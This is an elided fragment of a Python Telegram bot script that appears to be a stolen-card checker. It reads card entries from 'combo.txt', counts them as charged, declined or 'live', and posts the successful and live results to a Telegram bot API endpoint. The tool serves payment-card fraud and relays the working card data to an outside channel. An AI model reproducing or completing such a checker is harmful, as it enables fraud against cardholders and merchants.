		...
		try:
			with open("combo.txt", 'r') as file:
				...
				for cc in lino:
					...
					allnamber = ch+dd+live+nod+nosh+ccnn
					
					cm9 = types.InlineKeyboardButton(f"all total {allnamber}",callback_data='x')
...
»» @EbrahimEldsoky""")				
					...
					if 'success":false' in last:
						dd+=1
		
					elif 'success":true' in last:
						ch+=1
						bot.reply_to(message,charge)
						requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={id}&text={last}true')

						
					else:
						live+=1
						requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={id}&text={last}else')
